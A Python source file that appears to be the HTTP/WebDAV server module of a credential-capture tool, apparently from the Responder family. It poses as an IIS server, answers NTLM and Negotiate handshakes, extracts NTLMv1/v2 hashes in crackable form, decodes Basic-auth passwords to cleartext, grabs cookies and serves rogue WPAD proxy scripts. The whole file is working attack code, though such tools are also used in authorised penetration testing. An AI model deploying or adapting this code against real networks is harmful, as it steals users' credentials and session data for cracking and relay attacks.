#!/usr/bin/env python
import struct
import codecs
from socketserver import BaseRequestHandler, StreamRequestHandler
from base64 import b64decode, b64encode
from ..packets import NTLM_Challenge
from ..packets import IIS_Auth_401_Ans, IIS_Auth_Granted, IIS_NTLM_Challenge_Ans, IIS_Basic_401_Ans
from ..utils import *

# Parse NTLMv1/v2 hash.
def ParseHTTPHash(data, Challenge, client, module):
	LMhashLen    = struct.unpack('<H',data[12:14])[0]
	LMhashOffset = struct.unpack('<H',data[16:18])[0]
	LMHash       = data[LMhashOffset:LMhashOffset+LMhashLen]
	LMHashFinal  = codecs.encode(LMHash, 'hex').upper().decode('latin-1')
	NthashLen    = struct.unpack('<H',data[20:22])[0]
	NthashOffset = struct.unpack('<H',data[24:26])[0]
	NTHash       = data[NthashOffset:NthashOffset+NthashLen]
	NTHashFinal  = codecs.encode(NTHash, 'hex').upper().decode('latin-1')
	UserLen      = struct.unpack('<H',data[36:38])[0]
	UserOffset   = struct.unpack('<H',data[40:42])[0]
	User         = data[UserOffset:UserOffset+UserLen].decode('latin-1').replace('\x00','')
	Challenge1    = codecs.encode(Challenge,'hex').decode('latin-1')
	if NthashLen == 24:
		HostNameLen     = struct.unpack('<H',data[46:48])[0]
		HostNameOffset  = struct.unpack('<H',data[48:50])[0]
		HostName        = data[HostNameOffset:HostNameOffset+HostNameLen].decode('latin-1').replace('\x00','')
		WriteHash       = '%s::%s:%s:%s:%s' % (User, HostName, LMHashFinal, NTHashFinal, Challenge1)
		Info            = {'module': module, 'type': 'NTLMv1', 'client': client, 'host': HostName, 'user': User, 'hash': LMHashFinal+':'+NTHashFinal, 'fullhash': WriteHash}
		PrintHash(Info)

	if NthashLen > 24:
		NthashLen      = 64
		DomainLen      = struct.unpack('<H',data[28:30])[0]
		DomainOffset   = struct.unpack('<H',data[32:34])[0]
		Domain         = data[DomainOffset:DomainOffset+DomainLen].decode('latin-1').replace('\x00','')
		HostNameLen    = struct.unpack('<H',data[44:46])[0]
		HostNameOffset = struct.unpack('<H',data[48:50])[0]
		HostName       = data[HostNameOffset:HostNameOffset+HostNameLen].decode('latin-1').replace('\x00','')
		WriteHash      = '%s::%s:%s:%s:%s' % (User, Domain, Challenge1, NTHashFinal[:32], NTHashFinal[32:])
		Info           = {'module': module, 'type': 'NTLMv2', 'client': client, 'host': HostName, 'user': Domain + '\\' + User, 'hash': NTHashFinal[:32] + ':' + NTHashFinal[32:], 'fullhash': WriteHash}
		PrintHash(Info)

def GrabCookie(data, host):
	Cookie = re.search(r'(Cookie:*.\=*)[^\r\n]*', data)
	if Cookie:
		Cookie = Cookie.group(0).replace('Cookie: ', '')
		return Cookie
	return False

def GrabReferer(data, host):
	Referer = re.search(r'(Referer:*.\=*)[^\r\n]*', data)
	if Referer:
		Referer = Referer.group(0).replace('Referer: ', '')
		return Referer
	return False

def WpadCustom(data, client):
	Wpad = re.search(r'(/wpad.dat|/*\.pac)', data)
	if Wpad:
		Buffer = WPADScript()
		Buffer.calculate()
		return str(Buffer)
	return False

def IsWebDAV(data):
	return True if re.search('PROPFIND', data) else False

def GrabURL(data, host):
	GET = re.findall(r'(?<=GET )[^HTTP]*', data)
	POST = re.findall(r'(?<=POST )[^HTTP]*', data)
	POSTDATA = re.findall(r'(?<=\r\n\r\n)[^*]*', data)

# Handle HTTP packet sequence.
def PacketSequence(data, client, Challenge):
	NTLM_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
	NTLM_Auth2 = re.findall(r'(?<=Authorization: Negotiate )[^\r]*', data)
	Basic_Auth = re.findall(r'(?<=Authorization: Basic )[^\r]*', data)



	if NTLM_Auth:
		Packet_NTLM = b64decode(''.join(NTLM_Auth))[8:9]
		if Packet_NTLM == b'\x01':
			GrabURL(data, client)
			#GrabReferer(data, client)
			GrabCookie(data, client)

			Buffer = NTLM_Challenge(ServerChallenge=RecvBuffer(Challenge))
			Buffer.calculate()

			Buffer_Ans = IIS_NTLM_Challenge_Ans(Payload = b64encode(SendBuffer(Buffer)).decode('latin-1'))
			Buffer_Ans.calculate()
			return Buffer_Ans

		if Packet_NTLM == b'\x03':
			NTLM_Auth = b64decode(''.join(NTLM_Auth))
			module = "WebDAV" if IsWebDAV(data) else "HTTP"
			ParseHTTPHash(NTLM_Auth, Challenge, client, module)
			Buffer = IIS_Auth_Granted()
			Buffer.calculate()
			return Buffer
				
	elif NTLM_Auth2:
		Packet_NTLM = b64decode(''.join(NTLM_Auth2))[8:9]
		if Packet_NTLM == b'\x01':
			GrabURL(data, client)
			#GrabReferer(data, client)
			GrabCookie(data, client)

			Buffer = NTLM_Challenge(ServerChallenge=RecvBuffer(Challenge))
			Buffer.calculate()
			Buffer_Ans = IIS_NTLM_Challenge_Ans(WWWAuth = "WWW-Authenticate: Negotiate ", Payload = b64encode(SendBuffer(Buffer)).decode('latin-1'))
			Buffer_Ans.calculate()
			return Buffer_Ans

		if Packet_NTLM == b'\x03':
			NTLM_Auth = b64decode(''.join(NTLM_Auth2))
			module = "WebDAV" if IsWebDAV(data) else "HTTP"
			ParseHTTPHash(NTLM_Auth, Challenge, client, module)
			Buffer = IIS_Auth_Granted()
			Buffer.calculate()
			return Buffer

	elif Basic_Auth:
		ClearText_Auth = b64decode(''.join(Basic_Auth))

		GrabURL(data, client)
		#GrabReferer(data, client)
		GrabCookie(data, client)

		Info = {'module': 'HTTP', 'type': 'Basic', 'client': client, 'user': ClearText_Auth.decode('latin-1').split(':', maxsplit=1)[0], 'cleartext': ClearText_Auth.decode('latin-1').split(':', maxsplit=1)[1]}
		PrintHash(Info)

		Buffer = IIS_Auth_Granted()
		Buffer.calculate()
		return Buffer
	else:
		Response = IIS_Auth_401_Ans()
		Response.calculate()
		return Response

# HTTP Server class
class HTTP(BaseRequestHandler):

	def handle(self):
		try:
			Challenge = RandomChallenge()
			while True:
				self.request.settimeout(3)
				remaining = 10*1024*1024 #setting max recieve size
				data = ''
				while True:
					buff = ''
					buff = RecvBuffer(self.request.recv(8092))
					if buff == '':
						break
					data += buff
					remaining -= len(buff)
					#check if we recieved the full header
					if data.find('\r\n\r\n') != -1: 
						#we did, now to check if there was anything else in the request besides the header
						if data.find('Content-Length') == -1:
							#request contains only header
							break
						else:
							#searching for that content-length field in the header
							for line in data.split('\r\n'):
								if line.find('Content-Length') != -1:
									line = line.strip()
									remaining = int(line.split(':')[1].strip()) - len(data)
					if remaining <= 0:
						break
				if data == "":
					break
				#now the data variable has the full request
				Buffer = WpadCustom(data, self.client_address[0])

				if Buffer:
					self.request.send(SendBuffer(Buffer))
					self.request.close()

				else:
					Buffer = PacketSequence(data,self.client_address[0], Challenge)
					self.request.send(SendBuffer(Buffer))
		
		except:
			pass
			

